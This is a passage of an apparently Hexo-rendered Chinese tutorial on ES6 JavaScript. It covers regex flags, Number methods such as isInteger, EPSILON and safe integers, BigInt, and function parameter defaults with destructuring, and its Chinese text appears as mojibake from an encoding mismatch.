<code>RegExp.prototype[Symbol.match]</code></li><li><code>String.prototype.replace</code> è°ƒç”¨ <code>RegExp.prototype[Symbol.replace]</code></li><li><code>String.prototype.search</code> è°ƒç”¨ <code>RegExp.prototype[Symbol.search]</code></li><li><code>String.prototype.split</code> è°ƒç”¨ <code>RegExp.prototype[Symbol.split]</code></li></ul><h2 id="3ã€u-ä¿®é¥°ç¬¦"><a href="#3ã€u-ä¿®é¥°ç¬¦" class="headerlink" title="3ã€u ä¿®é¥°ç¬¦"></a>3ã€u ä¿®é¥°ç¬¦</h2><p>ES6 å¯¹æ­£åˆ™è¡¨è¾¾å¼æ·»åŠ äº†<code>u</code>ä¿®é¥°ç¬¦ï¼Œå«ä¹‰ä¸ºâ€œUnicode æ¨¡å¼â€ï¼Œç”¨æ¥æ­£ç¡®å¤„ç†å¤§äº<code>\uFFFF</code>çš„ Unicode å­—ç¬¦ã€‚</p><h2 id="4ã€y-ä¿®é¥°ç¬¦ï¼ˆâ€ç²˜è¿â€ä¿®é¥°ç¬¦ï¼‰"><a href="#4ã€y-ä¿®é¥°ç¬¦ï¼ˆâ€ç²˜è¿â€ä¿®é¥°ç¬¦ï¼‰" class="headerlink" title="4ã€y ä¿®é¥°ç¬¦ï¼ˆâ€ç²˜è¿â€ä¿®é¥°ç¬¦ï¼‰"></a>4ã€y ä¿®é¥°ç¬¦ï¼ˆâ€ç²˜è¿â€ä¿®é¥°ç¬¦ï¼‰</h2><p><code>y</code>ä¿®é¥°ç¬¦çš„ä½œç”¨ä¸<code>g</code>ä¿®é¥°ç¬¦ç±»ä¼¼ï¼Œä¹Ÿæ˜¯å…¨å±€åŒ¹é…ï¼Œåä¸€æ¬¡åŒ¹é…éƒ½ä»ä¸Šä¸€æ¬¡åŒ¹é…æˆåŠŸçš„ä¸‹ä¸€ä¸ªä½ç½®å¼€å§‹ã€‚ä¸åŒä¹‹å¤„åœ¨äºï¼Œ<code>g</code>ä¿®é¥°ç¬¦åªè¦å‰©ä½™ä½ç½®ä¸­å­˜åœ¨åŒ¹é…å°±å¯ï¼Œè€Œ<code>y</code>ä¿®é¥°ç¬¦ç¡®ä¿åŒ¹é…å¿…é¡»ä»å‰©ä½™çš„ç¬¬ä¸€ä¸ªä½ç½®å¼€å§‹ï¼Œè¿™ä¹Ÿå°±æ˜¯â€œç²˜è¿â€çš„æ¶µä¹‰ã€‚</p><h2 id="5ã€RegExp-prototype-flags-å±æ€§"><a href="#5ã€RegExp-prototype-flags-å±æ€§" class="headerlink" title="5ã€RegExp.prototype.flags å±æ€§"></a>5ã€RegExp.prototype.flags å±æ€§</h2><p>ES6 ä¸ºæ­£åˆ™è¡¨è¾¾å¼æ–°å¢äº†<code>flags</code>å±æ€§ï¼Œä¼šè¿”å›æ­£åˆ™è¡¨è¾¾å¼çš„ä¿®é¥°ç¬¦ã€‚</p><h2 id="6ã€s-ä¿®é¥°ç¬¦ï¼šdotAll-æ¨¡å¼"><a href="#6ã€s-ä¿®é¥°ç¬¦ï¼šdotAll-æ¨¡å¼" class="headerlink" title="6ã€s ä¿®é¥°ç¬¦ï¼šdotAll æ¨¡å¼"></a>6ã€s ä¿®é¥°ç¬¦ï¼šdotAll æ¨¡å¼</h2><h1 id="æ•°å€¼çš„æ‰©å±•"><a href="#æ•°å€¼çš„æ‰©å±•" class="headerlink" title="æ•°å€¼çš„æ‰©å±•"></a>æ•°å€¼çš„æ‰©å±•</h1><h2 id="1ã€äºŒè¿›åˆ¶å’Œå…«è¿›åˆ¶è¡¨ç¤ºæ³•"><a href="#1ã€äºŒè¿›åˆ¶å’Œå…«è¿›åˆ¶è¡¨ç¤ºæ³•" class="headerlink" title="1ã€äºŒè¿›åˆ¶å’Œå…«è¿›åˆ¶è¡¨ç¤ºæ³•"></a>1ã€äºŒè¿›åˆ¶å’Œå…«è¿›åˆ¶è¡¨ç¤ºæ³•</h2><p>ES6 æä¾›äº†äºŒè¿›åˆ¶å’Œå…«è¿›åˆ¶æ•°å€¼çš„æ–°çš„å†™æ³•ï¼Œåˆ†åˆ«ç”¨å‰ç¼€<code>0b</code>ï¼ˆæˆ–<code>0B</code>ï¼‰å’Œ<code>0o</code>ï¼ˆæˆ–<code>0O</code>ï¼‰è¡¨ç¤ºã€‚</p><p>å¦‚æœè¦å°†<code>0b</code>å’Œ<code>0o</code>å‰ç¼€çš„å­—ç¬¦ä¸²æ•°å€¼è½¬ä¸ºåè¿›åˆ¶ï¼Œè¦ä½¿ç”¨<code>Number</code>æ–¹æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>(<span class="string">&#x27;0b111&#x27;</span>)  <span class="comment">// 7</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">&#x27;0o10&#x27;</span>)  <span class="comment">// 8</span></span><br></pre></td></tr></table></figure><h2 id="2ã€Number-isFinite-Number-isNaN"><a href="#2ã€Number-isFinite-Number-isNaN" class="headerlink" title="2ã€Number.isFinite(), Number.isNaN()"></a>2ã€Number.isFinite(), Number.isNaN()</h2><p><code>Number.isFinite()</code>ç”¨æ¥æ£€æŸ¥ä¸€ä¸ªæ•°å€¼æ˜¯å¦ä¸ºæœ‰é™çš„ï¼ˆfiniteï¼‰ï¼Œå³ä¸æ˜¯<code>Infinity</code>ã€‚å¦‚æœå‚æ•°ç±»å‹ä¸æ˜¯æ•°å€¼ï¼Œ<code>Number.isFinite</code>ä¸€å¾‹è¿”å›<code>false</code>ã€‚</p><p><code>Number.isNaN()</code>ç”¨æ¥æ£€æŸ¥ä¸€ä¸ªå€¼æ˜¯å¦ä¸º<code>NaN</code>ã€‚å¦‚æœå‚æ•°ç±»å‹ä¸æ˜¯<code>NaN</code>ï¼Œ<code>Number.isNaN</code>ä¸€å¾‹è¿”å›<code>false</code>ã€‚</p><p>å®ƒä»¬ä¸ä¼ ç»Ÿçš„å…¨å±€æ–¹æ³•<code>isFinite()</code>å’Œ<code>isNaN()</code>çš„åŒºåˆ«åœ¨äºï¼Œä¼ ç»Ÿæ–¹æ³•å…ˆè°ƒç”¨<code>Number()</code>å°†éæ•°å€¼çš„å€¼è½¬ä¸ºæ•°å€¼ï¼Œå†è¿›è¡Œåˆ¤æ–­ï¼Œè€Œè¿™ä¸¤ä¸ªæ–°æ–¹æ³•åªå¯¹æ•°å€¼æœ‰æ•ˆã€‚</p><h2 id="3ã€Number-parseInt-Number-parseFloat"><a href="#3ã€Number-parseInt-Number-parseFloat" class="headerlink" title="3ã€Number.parseInt(), Number.parseFloat()"></a>3ã€Number.parseInt(), Number.parseFloat()</h2><p>é€æ­¥å‡å°‘å…¨å±€æ€§æ–¹æ³•ï¼Œä½¿å¾—è¯­è¨€é€æ­¥æ¨¡å—åŒ–ã€‚</p><h2 id="4ã€Number-isInteger"><a href="#4ã€Number-isInteger" class="headerlink" title="4ã€Number.isInteger()"></a>4ã€Number.isInteger()</h2><p>JavaScript å†…éƒ¨ï¼Œæ•´æ•°å’Œæµ®ç‚¹æ•°é‡‡ç”¨çš„æ˜¯åŒæ ·çš„å‚¨å­˜æ–¹æ³•ï¼Œæ‰€ä»¥ 25 å’Œ 25.0 è¢«è§†ä¸ºåŒä¸€ä¸ªå€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">25</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">25.0</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>å¦‚æœå‚æ•°ä¸æ˜¯æ•°å€¼ï¼Œ<code>Number.isInteger</code>è¿”å›<code>false</code>ã€‚</p><p>æ³¨æ„ï¼Œç”±äº JavaScript é‡‡ç”¨ IEEE 754 æ ‡å‡†ï¼Œæ•°å€¼å­˜å‚¨ä¸º64ä½åŒç²¾åº¦æ ¼å¼ï¼Œæ•°å€¼ç²¾åº¦æœ€å¤šå¯ä»¥è¾¾åˆ° 53 ä¸ªäºŒè¿›åˆ¶ä½ï¼ˆ1 ä¸ªéšè—ä½ä¸ 52 ä¸ªæœ‰æ•ˆä½ï¼‰ã€‚å¦‚æœæ•°å€¼çš„ç²¾åº¦è¶…è¿‡è¿™ä¸ªé™åº¦ï¼Œç¬¬54ä½åŠåé¢çš„ä½å°±ä¼šè¢«ä¸¢å¼ƒï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œ<code>Number.isInteger</code>å¯èƒ½ä¼šè¯¯åˆ¤ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">3.0000000000000002</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>åŸå› æ˜¯è¿™ä¸ªå°æ•°çš„ç²¾åº¦è¾¾åˆ°äº†å°æ•°ç‚¹å16ä¸ªåè¿›åˆ¶ä½ï¼Œè½¬æˆäºŒè¿›åˆ¶ä½è¶…è¿‡äº†53ä¸ªäºŒè¿›åˆ¶ä½ï¼Œå¯¼è‡´æœ€åçš„é‚£ä¸ª<code>2</code>è¢«ä¸¢å¼ƒäº†ã€‚</p><h2 id="5ã€Number-EPSILON"><a href="#5ã€Number-EPSILON" class="headerlink" title="5ã€Number.EPSILON"></a>5ã€Number.EPSILON</h2><p>å®ƒè¡¨ç¤º 1 ä¸å¤§äº 1 çš„æœ€å°æµ®ç‚¹æ•°ä¹‹é—´çš„å·®ã€‚</p><p>å¯¹äº 64 ä½æµ®ç‚¹æ•°æ¥è¯´ï¼Œå¤§äº 1 çš„æœ€å°æµ®ç‚¹æ•°ç›¸å½“äºäºŒè¿›åˆ¶çš„<code>1.00..001</code>ï¼Œå°æ•°ç‚¹åé¢æœ‰è¿ç»­ 51 ä¸ªé›¶ã€‚è¿™ä¸ªå€¼å‡å» 1 ä¹‹åï¼Œå°±ç­‰äº 2 çš„ -52 æ¬¡æ–¹ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.EPSILON === <span class="built_in">Math</span>.pow(<span class="number">2</span>, -<span class="number">52</span>)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>å¼•å…¥ä¸€ä¸ªè¿™ä¹ˆå°çš„é‡çš„ç›®çš„ï¼Œåœ¨äºä¸ºæµ®ç‚¹æ•°è®¡ç®—ï¼Œè®¾ç½®ä¸€ä¸ªè¯¯å·®èŒƒå›´ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span></span><br><span class="line"><span class="comment">// 0.30000000000000004</span></span><br><span class="line"></span><br><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span> - <span class="number">0.3</span></span><br><span class="line"><span class="comment">// 5.551115123125783e-17</span></span><br></pre></td></tr></table></figure><p><code>Number.EPSILON</code>å¯ä»¥ç”¨æ¥è®¾ç½®â€œèƒ½å¤Ÿæ¥å—çš„è¯¯å·®èŒƒå›´â€ã€‚æ¯”å¦‚ï¼Œè¯¯å·®èŒƒå›´è®¾ä¸º 2 çš„-50 æ¬¡æ–¹ï¼ˆå³<code>Number.EPSILON * Math.pow(2, 2)</code>ï¼‰ï¼Œå³å¦‚æœä¸¤ä¸ªæµ®ç‚¹æ•°çš„å·®å°äºè¿™ä¸ªå€¼ï¼Œæˆ‘ä»¬å°±è®¤ä¸ºè¿™ä¸¤ä¸ªæµ®ç‚¹æ•°ç›¸ç­‰ã€‚</p><p>å› æ­¤ï¼Œ<code>Number.EPSILON</code>çš„å®è´¨æ˜¯<strong>ä¸€ä¸ªå¯ä»¥æ¥å—çš„æœ€å°è¯¯å·®èŒƒå›´</strong>ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withinErrorMargin</span> (<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.abs(left - right) &lt; <span class="built_in">Number</span>.EPSILON * <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span> === <span class="number">0.3</span> <span class="comment">// false</span></span><br><span class="line">withinErrorMargin(<span class="number">0.1</span> + <span class="number">0.2</span>, <span class="number">0.3</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.1</span> + <span class="number">1.3</span> === <span class="number">2.4</span> <span class="comment">// false</span></span><br><span class="line">withinErrorMargin(<span class="number">1.1</span> + <span class="number">1.3</span>, <span class="number">2.4</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="6ã€å®‰å…¨æ•´æ•°å’Œ-Number-isSafeInteger"><a href="#6ã€å®‰å…¨æ•´æ•°å’Œ-Number-isSafeInteger" class="headerlink" title="6ã€å®‰å…¨æ•´æ•°å’Œ Number.isSafeInteger()"></a>6ã€å®‰å…¨æ•´æ•°å’Œ Number.isSafeInteger()</h2><p>JavaScript èƒ½å¤Ÿå‡†ç¡®è¡¨ç¤ºçš„æ•´æ•°èŒƒå›´åœ¨<code>-2^53</code>åˆ°<code>2^53</code>ä¹‹é—´ï¼ˆä¸å«ä¸¤ä¸ªç«¯ç‚¹ï¼‰ï¼Œè¶…è¿‡è¿™ä¸ªèŒƒå›´ï¼Œæ— æ³•ç²¾ç¡®è¡¨ç¤ºè¿™ä¸ªå€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>) <span class="comment">// 9007199254740992</span></span><br><span class="line"></span><br><span class="line"><span class="number">9007199254740992</span>  <span class="comment">// 9007199254740992</span></span><br><span class="line"><span class="number">9007199254740993</span>  <span class="comment">// 9007199254740992</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>) === <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>) + <span class="number">1</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>ES6 å¼•å…¥äº†<code>Number.MAX_SAFE_INTEGER</code>å’Œ<code>Number.MIN_SAFE_INTEGER</code>è¿™ä¸¤ä¸ªå¸¸é‡ï¼Œç”¨æ¥è¡¨ç¤ºè¿™ä¸ªèŒƒå›´çš„ä¸Šä¸‹é™ã€‚</p><p><code>Number.isSafeInteger()</code>åˆ™æ˜¯ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªæ•´æ•°æ˜¯å¦è½åœ¨è¿™ä¸ªèŒƒå›´ä¹‹å†…ã€‚è¿™ä¸ªå‡½æ•°çš„å®ç°å¾ˆç®€å•ï¼Œå°±æ˜¯è·Ÿå®‰å…¨æ•´æ•°çš„ä¸¤ä¸ªè¾¹ç•Œå€¼æ¯”è¾ƒä¸€ä¸‹ï¼ˆåŒæ—¶éªŒè¯å‚ä¸è¿ç®—çš„æ¯ä¸ªå€¼ï¼‰ã€‚</p><h2 id="7ã€BigInt-æ•°æ®ç±»å‹"><a href="#7ã€BigInt-æ•°æ®ç±»å‹" class="headerlink" title="7ã€BigInt æ•°æ®ç±»å‹"></a>7ã€BigInt æ•°æ®ç±»å‹</h2><p>ES2020 å¼•å…¥äº†ä¸€ç§æ–°çš„æ•°æ®ç±»å‹ BigIntï¼ˆå¤§æ•´æ•°ï¼‰ï¼Œè¿™æ˜¯ ECMAScript çš„ç¬¬å…«ç§æ•°æ®ç±»å‹ã€‚BigInt åªç”¨æ¥è¡¨ç¤ºæ•´æ•°ï¼Œæ²¡æœ‰ä½æ•°çš„é™åˆ¶ï¼Œä»»ä½•ä½æ•°çš„æ•´æ•°éƒ½å¯ä»¥ç²¾ç¡®è¡¨ç¤ºã€‚</p><p>ä¸ºäº†ä¸ Number ç±»å‹åŒºåˆ«ï¼ŒBigInt ç±»å‹çš„æ•°æ®å¿…é¡»æ·»åŠ åç¼€<code>n</code>ã€‚BigInt åŒæ ·å¯ä»¥ä½¿ç”¨å„ç§è¿›åˆ¶è¡¨ç¤ºï¼Œéƒ½è¦åŠ ä¸Šåç¼€<code>n</code>ã€‚</p><p>BigInt ä¸æ™®é€šæ•´æ•°æ˜¯ä¸¤ç§å€¼ï¼Œå®ƒä»¬ä¹‹é—´å¹¶ä¸ç›¸ç­‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">42n</span> === <span class="number">42</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h1 id="å‡½æ•°çš„æ‰©å±•"><a href="#å‡½æ•°çš„æ‰©å±•" class="headerlink" title="å‡½æ•°çš„æ‰©å±•"></a>å‡½æ•°çš„æ‰©å±•</h1><h2 id="1ã€å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼"><a href="#1ã€å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼" class="headerlink" title="1ã€å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼"></a>1ã€å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼</h2><h3 id="åŸºæœ¬ç”¨æ³•-3"><a href="#åŸºæœ¬ç”¨æ³•-3" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h3><p>ES6 å…è®¸ä¸ºå‡½æ•°çš„å‚æ•°è®¾ç½®é»˜è®¤å€¼ï¼Œå³ç›´æ¥å†™åœ¨å‚æ•°å®šä¹‰çš„åé¢ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">x, y = <span class="string">&#x27;World&#x27;</span></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log(<span class="string">&#x27;Hello&#x27;</span>) <span class="comment">// Hello World</span></span><br><span class="line">log(<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;China&#x27;</span>) <span class="comment">// Hello China</span></span><br><span class="line">log(<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment">// Hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¦ä¸€ä¸ªä¾‹å­</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x = <span class="number">0</span>, y = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.x = x;</span><br><span class="line">  <span class="built_in">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> Point();</span><br><span class="line">p <span class="comment">// &#123; x: 0, y: 0 &#125;</span></span><br></pre></td></tr></table></figure><p>å‚æ•°å˜é‡æ˜¯é»˜è®¤å£°æ˜çš„ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨<code>let</code>æˆ–<code>const</code>å†æ¬¡å£°æ˜ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x = <span class="number">5</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="number">1</span>; <span class="comment">// error</span></span><br><span class="line">  <span class="keyword">const</span> x = <span class="number">2</span>; <span class="comment">// error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸”ä½¿ç”¨å‚æ•°é»˜è®¤å€¼æ—¶ï¼Œå‡½æ•°ä¸èƒ½æœ‰åŒåå‚æ•°ã€‚æ­¤å¤–ï¼Œå‚æ•°é»˜è®¤å€¼ä¸æ˜¯ä¼ å€¼çš„ï¼Œè€Œæ˜¯æ¯æ¬¡éƒ½é‡æ–°è®¡ç®—é»˜è®¤å€¼è¡¨è¾¾å¼çš„å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå‚æ•°é»˜è®¤å€¼æ˜¯æƒ°æ€§æ±‚å€¼çš„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="number">99</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">p = x + <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo() <span class="comment">// 100</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">100</span>;</span><br><span class="line">foo() <span class="comment">// 101</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå‚æ•°<code>p</code>çš„é»˜è®¤å€¼æ˜¯<code>x + 1</code>ã€‚è¿™æ—¶ï¼Œæ¯æ¬¡è°ƒç”¨å‡½æ•°<code>foo</code>ï¼Œéƒ½ä¼šé‡æ–°è®¡ç®—<code>x + 1</code>ï¼Œè€Œä¸æ˜¯é»˜è®¤<code>p</code>ç­‰äº 100ã€‚</p><h3 id="ä¸è§£æ„èµ‹å€¼é»˜è®¤å€¼ç»“åˆä½¿ç”¨"><a href="#ä¸è§£æ„èµ‹å€¼é»˜è®¤å€¼ç»“åˆä½¿ç”¨" class="headerlink" title="ä¸è§£æ„èµ‹å€¼é»˜è®¤å€¼ç»“åˆä½¿ç”¨"></a>ä¸è§£æ„èµ‹å€¼é»˜è®¤å€¼ç»“åˆä½¿ç”¨</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">&#123;x, y = <span class="number">5</span>&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(&#123;&#125;) <span class="comment">// undefined 5</span></span><br><span class="line">foo(&#123;<span class="attr">x</span>: <span class="number">1</span>&#125;) <span class="comment">// 1 5</span></span><br><span class="line">foo(&#123;<span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">2</span>&#125;) <span class="comment">// 1 2</span></span><br><span class="line">foo() <span class="comment">// TypeError: Cannot read property &#x27;x&#x27; of undefined</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç åªä½¿ç”¨äº†å¯¹è±¡çš„è§£æ„èµ‹å€¼é»˜è®¤å€¼ï¼Œæ²¡æœ‰ä½¿ç”¨å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼ã€‚åªæœ‰å½“å‡½æ•°<code>foo</code>çš„å‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå˜é‡<code>x</code>å’Œ<code>y</code>æ‰ä¼šé€šè¿‡è§£æ„èµ‹å€¼ç”Ÿæˆã€‚å¦‚æœå‡½æ•°<code>foo</code>è°ƒç”¨æ—¶æ²¡æä¾›å‚æ•°ï¼Œå˜é‡<code>x</code>å’Œ<code>y</code>å°±ä¸ä¼šç”Ÿæˆï¼Œä»è€ŒæŠ¥é”™ã€‚é€šè¿‡æä¾›å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼ï¼Œå°±å¯ä»¥é¿å…è¿™ç§æƒ…å†µã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">&#123;x, y = <span class="number">5</span>&#125; = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo() <span class="comment">// undefined 5</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç æŒ‡å®šï¼Œå¦‚æœæ²¡æœ‰æä¾›å‚æ•°ï¼Œå‡½æ•°<code>foo</code>çš„å‚æ•°é»˜è®¤ä¸ºä¸€ä¸ªç©ºå¯¹è±¡ã€‚</p><p>ä¸‹é¢æ˜¯å¦ä¸€ä¸ªè§£æ„èµ‹å€¼é»˜è®¤å€¼çš„ä¾‹å­ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params">url, &#123; body = <span class="string">&#x27;&#x27;</span>, method = <span class="string">&#x27;GET&#x27;</span>, headers = &#123;&#125; &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&#x27;http://example.com&#x27;</span>, &#123;&#125;)</span><br><span class="line"><span class="comment">// &quot;GET&quot;</span></span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line"><span class="comment">// æŠ¥é”™</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå¦‚æœå‡½æ•°<code>fetch</code>çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå°±å¯ä»¥ä¸ºå®ƒçš„ä¸‰ä¸ªå±æ€§è®¾ç½®é»˜è®¤å€¼ã€‚è¿™ç§å†™æ³•ä¸èƒ½çœç•¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œå¦‚æœç»“åˆå‡½æ•°å‚æ•°çš„é»˜è®¤å€¼ï¼Œå°±å¯ä»¥çœç•¥ç¬¬äºŒä¸ªå‚æ•°ã€‚è¿™æ—¶ï¼Œå°±å‡ºç°äº†åŒé‡é»˜è®¤å€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params">url, &#123; body = <span class="string">&#x27;&#x27;</span>, method = <span class="string">&#x27;GET&#x27;</span>, headers = &#123;&#125; &#125; = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;GET&quot;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå‡½æ•°<code>fetch</code>æ²¡æœ‰ç¬¬äºŒä¸ªå‚æ•°æ—¶ï¼Œå‡½æ•°å‚æ•°çš„é»˜è®¤å€¼å°±ä¼šç”Ÿæ•ˆï¼Œç„¶åæ‰æ˜¯è§£æ„èµ‹å€¼çš„é»˜è®¤å€¼ç”Ÿæ•ˆï¼Œå˜é‡<code>method</code>æ‰ä¼šå–åˆ°é»˜è®¤å€¼<code>GET</code>ã€‚</p><h3 id="å‚æ•°é»˜è®¤å€¼çš„ä½ç½®"><a href="#å‚æ•°é»˜è®¤å€¼çš„ä½ç½®" class="headerlink" title="å‚æ•°é»˜è®¤å€¼çš„ä½ç½®"></a>å‚æ•°é»˜è®¤å€¼çš„ä½ç½®</h3><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œå®šä¹‰äº†é»˜è®¤å€¼çš„å‚æ•°ï¼Œåº”è¯¥æ˜¯å‡½æ•°çš„å°¾å‚æ•°ã€‚</p><p>å¦‚æœä¼ å…¥<code>undefined</code>ï¼Œå°†è§¦å‘è¯¥å‚æ•°ç­‰äºé»˜è®¤å€¼ï¼Œ<code>null</code>åˆ™æ²¡æœ‰è¿™ä¸ªæ•ˆæœã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x = <span class="number">5</span>, y = <span class="number">6</span></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(<span class="literal">undefined</span>, <span class="literal">null</span>)</span><br><span class="line"><span class="comment">// 5 null</span></span><br></pre></td></tr></table></figure><h3 id="å‡½æ•°çš„-length-å±æ€§"><a href="#å‡½æ•°çš„-length-å±æ€§" class="headerlink" title="å‡½æ•°çš„ length å±æ€§"></a>å‡½æ•°çš„ length å±æ€§</h3><p>æŒ‡å®šäº†é»˜è®¤å€¼ä»¥åï¼Œå‡½æ•°çš„<code>length</code>å±æ€§ï¼Œå°†è¿”å›æ²¡æœ‰æŒ‡å®šé»˜è®¤å€¼çš„å‚æ•°ä¸ªæ•°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒæŒ‡å®šäº†é»˜è®¤å€¼åï¼Œ<code>length</code>å±æ€§å°†å¤±çœŸã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;&#125;).length <span class="comment">// 1</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a = <span class="number">5</span></span>) </span>&#123;&#125;).length <span class="comment">// 0</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a, b, c = <span class="number">5</span></span>) </span>&#123;&#125;).length <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å› ä¸º<code>length</code>å±æ€§çš„å«ä¹‰æ˜¯ï¼Œè¯¥å‡½æ•°<strong>é¢„æœŸä¼ å…¥çš„å‚æ•°ä¸ªæ•°</strong>ã€‚æŸä¸ªå‚æ•°æŒ‡å®šé»˜è®¤å€¼ä»¥åï¼Œé¢„æœŸä¼ 